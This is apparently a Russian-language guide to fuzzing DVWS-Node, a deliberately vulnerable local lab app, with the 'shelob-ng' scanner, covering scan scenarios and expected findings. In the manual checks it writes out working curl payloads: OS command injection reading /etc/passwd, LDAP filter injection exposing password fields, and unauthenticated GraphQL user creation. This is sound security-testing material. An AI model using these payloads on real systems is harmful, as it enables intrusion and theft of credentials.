# shelob-ng / DVWS-Node — Complete Fuzzing Guide

[DVWS-Node](https://github.com/snoopysecurity/dvws-node) (Damn Vulnerable Web Services — Node.js)
покрывает **39 классов уязвимостей**: SQLi, NoSQL, OS command injection, LDAP, XPATH,
XML injection, XXE, path traversal, SSRF, JWT bypass, prototype pollution и GraphQL.

Отличительная черта: единственная мишень с **OS Command Injection** (прямое выполнение команд)
и **LDAP Injection** в REST API format.

---

## Быстрый старт

```bash
# 1. Запустить DVWS-Node (из upstream)
git clone https://github.com/snoopysecurity/dvws-node.git /opt/dvws-node
cd /opt/dvws-node && docker-compose up -d
echo "127.0.0.1 dvws.local" | sudo tee -a /etc/hosts

# 2. Запустить фаззер
cd /path/to/shelob-ng/example/dvws-node/
make setup
make run-2   # injection payloads (основной сценарий)
```

---

## Предварительные требования

| | |
|-|-|
| Docker + Compose v2 | запуск DVWS-Node |
| `/etc/hosts` запись | `127.0.0.1 dvws.local` |
| Go ≥ 1.22 | сборка shelob-ng |

---

## Установка

```bash
git clone https://github.com/snoopysecurity/dvws-node.git /opt/dvws-node
cd /opt/dvws-node
docker-compose up -d

# Добавить hostname
echo "127.0.0.1 dvws.local" | sudo tee -a /etc/hosts

# Ждать готовности
until curl -s http://localhost:80/ > /dev/null 2>&1; do
    echo -n "."; sleep 2
done; echo " ready!"

# Скачать spec
curl -s http://localhost:80/api-docs -o /tmp/dvws-spec.json
python3 -c "import json; d=json.load(open('/tmp/dvws-spec.json')); print('Paths:', len(d.get('paths',{})))"
# Ожидаем: Paths: 24
```

---

## Уязвимости DVWS-Node — Каталог

Полный каталог: `docs/knowledge-base/vuln-catalogue.md` (секция DVWS-Node).

| ID | Категория | Endpoint | Checker |
|----|----------|----------|---------|
| D01 | CORS Wildcard | все | BehavioralPatterns |
| D08 | LDAP Injection | `GET/POST /v2/users/ldap-search` | BehavioralPatterns |
| D09 | BOLA/IDOR | `GET /v2/notes/{noteId}` | NameSpaceRule |
| D10 | NoSQL `$where` | `POST /v2/notesearch` | BehavioralPatterns |
| D12 | XPATH Injection | `GET /v2/release/{release}` | BehavioralPatterns |
| D14 | OS Command Injection | `GET /v2/sysinfo/{command}` | BehavioralPatterns |
| D15 | Info Disclosure | `GET /v1/info` | **PathDiscovery** |
| D16 | SQLi (passphrase) | `GET /v2/passphrase/{username}` | BehavioralPatterns |
| D19 | Path Traversal | `POST /download` | BehavioralPatterns |
| D22 | No Rate Limiting | `POST /v2/login` | **RateLimitChecker** |
| D23 | Hidden v1 endpoint | `GET /v1/info` | **PathDiscovery** |
| D25/D26 | GraphQL | `POST /graphql` | BehavioralPatterns |

---

## Сценарии запуска

### Сценарий 1 — Базовый скан (все checkers)

```bash
make run-1
# или вручную:
./../../shelob-ng \
  -spec     /tmp/dvws-spec.json \
  -url      http://localhost:80 \
  -csp-disable \
  -duration 5m \
  -output   results/01_basic
```

**PathDiscovery** автоматически найдёт `/v1/info` — информационный "version divergence trap":
- `GET /v2/info` → 403
- `GET /v1/info` → 200 + `process.env` (JWT_SECRET, DB credentials, etc.)

**RateLimitChecker** найдёт `/v2/login` без rate limiting (D22).

---

### Сценарий 2 — Injection Payloads (основной сценарий)

```bash
make run-2
# или вручную:
./../../shelob-ng \
  -spec     /tmp/dvws-spec.json \
  -url      http://localhost:80 \
  -payloads sqli=../juice-shop/payloads/sqli.txt,\
            nosql=../juice-shop/payloads/nosql.txt,\
            cmdi=../juice-shop/payloads/cmdi.txt,\
            lfi=../juice-shop/payloads/lfi.txt \
  -csp-disable \
  -duration 15m \
  -output   results/02_injection
```

**Ожидаемые findings:**

| Checker | Severity | Уязвимость | Endpoint |
|---------|----------|-----------|---------|
| BehavioralPatterns | HIGH | OS Command Injection | `GET /v2/sysinfo/{command}` — `uid=0(root)` |
| BehavioralPatterns | HIGH | SQLi | `GET /v2/passphrase/{username}` — SQL syntax error |
| BehavioralPatterns | HIGH | LDAP Injection | `/v2/users/ldap-search?user=*` — все пользователи |
| BehavioralPatterns | MEDIUM | Path Traversal | `POST /download` — содержимое `/etc/passwd` |
| BehavioralPatterns | MEDIUM | NoSQL `$where` | `POST /v2/notesearch` — expanded result set |
| PathDiscovery | HIGH | Info Disclosure | `/v1/info` — env vars + JWT_SECRET |
| RateLimitChecker | HIGH | No Rate Limit | `POST /v2/login` |

---

### Сценарий 3 — Command Injection (проверка наиболее опасной уязвимости)

D14 — прямой RCE через path parameter:

```bash
# Запустить только BehavioralPatterns с cmdi payloads
./../../shelob-ng \
  -spec     /tmp/dvws-spec.json \
  -url      http://localhost:80 \
  -payloads cmdi=../juice-shop/payloads/cmdi.txt \
  -checker  BehavioralPatterns \
  -csp-disable \
  -duration 5m \
  -output   results/03_cmdi

# Воспроизвести вручную (получить auth token сначала)
TOKEN=$(curl -s -X POST http://localhost:80/v2/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"Admin1234!"}' \
  | python3 -c "import json,sys; print(json.load(sys.stdin).get('token',''))")

# Command injection через path parameter
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:80/v2/sysinfo/id"
# Ожидаем в ответе: uid=0(root) gid=0(root)

curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:80/v2/sysinfo/cat%20/etc/passwd"
# Ожидаем: root:x:0:0:root:/root:/bin/bash
```

---

### Сценарий 4 — LDAP Injection (уникальная для REST API уязвимость)

```bash
# Проверить LDAP injection вручную
# user=* возвращает всех пользователей (wildcard)
curl "http://localhost:80/v2/users/ldap-search?user=*"

# Attribute injection: получить password поле
curl "http://localhost:80/v2/users/ldap-search?user=admin)(objectClass=*"
# BehavioralPatterns должен поймать возврат password поля
```

---

### Сценарий 5 — Path Discovery (найти скрытый v1 endpoint)

```bash
# Целенаправленный pathscan
./../../shelob-ng \
  -spec     /tmp/dvws-spec.json \
  -url      http://localhost:80 \
  -checker  BehavioralPatterns \
  -csp-disable \
  -duration 30s \
  -output   results/05_pathscan
# PathDiscovery запускается до главного цикла

# Воспроизвести находку вручную
curl http://localhost:80/v1/info
# Ожидаем: {"versions":{...}, "env":{"JWT_SECRET":"...", "DB_PASSWORD":"..."}}

curl http://localhost:80/v2/info
# Ожидаем: 403 Forbidden
```

**Почему это важно:** v2 защищён, v1 забыт и открыт. Классический API versioning vulnerability (D23).

---

### Сценарий 6 — GraphQL (интроспекция и ACL bypass)

DVWS-Node имеет GraphQL endpoint рядом с REST.

```bash
# Ручная проверка GraphQL introspection
curl -X POST http://localhost:80/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { types { name } } }"}'
# Если возвращает полную схему — D25 (introspection open)

# ACL bypass через mutation
curl -X POST http://localhost:80/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"mutation { createUser(username:\"hacker\", password:\"pass\") { id } }"}'
# Если создаёт пользователя без auth — D26 (ACL bypass)
```

---

### Сценарий 7 — Полный аудит

```bash
./../../shelob-ng \
  -spec       /tmp/dvws-spec.json \
  -url        http://localhost:80 \
  -payloads   sqli=../juice-shop/payloads/sqli.txt,\
              nosql=../juice-shop/payloads/nosql.txt,\
              cmdi=../juice-shop/payloads/cmdi.txt,\
              lfi=../juice-shop/payloads/lfi.txt,\
              xss=../juice-shop/payloads/xss.txt \
  -corpus-dir corpus/full \
  -csp-disable \
  -duration   30m \
  -output     results/07_full_audit
```

---

## Интерпретация результатов

```bash
# Найти все OS Command Injection findings
grep -l '"Command Injection"' results/*/findings/*.json | xargs -I{} python3 -c "
import json; d=json.load(open('{}'))
print('POC:', d.get('poc','')[:200])"

# Coverage
python3 -c "
import json
d = json.load(open('results/02_injection/api-coverage.json'))
print(f'Coverage: {d[\"visited_count\"]}/{d[\"total\"]} ({100*d[\"visited_count\"]//d[\"total\"]}%)')
"
```

---

## Troubleshooting

| Проблема | Решение |
|---------|---------|
| DVWS-Node не отвечает | Добавить `127.0.0.1 dvws.local` в `/etc/hosts` |
| Spec не загружается | Spec endpoint: `http://localhost:80/api-docs` (не `/swagger.json`) |
| Command injection не находится | Нужен JWT token — запустить с `-user admin -password Admin1234!` |
| Spec неполная | Регенерировать: `docker exec $(docker ps -qf name=dvws) node swagger-generator.js` |
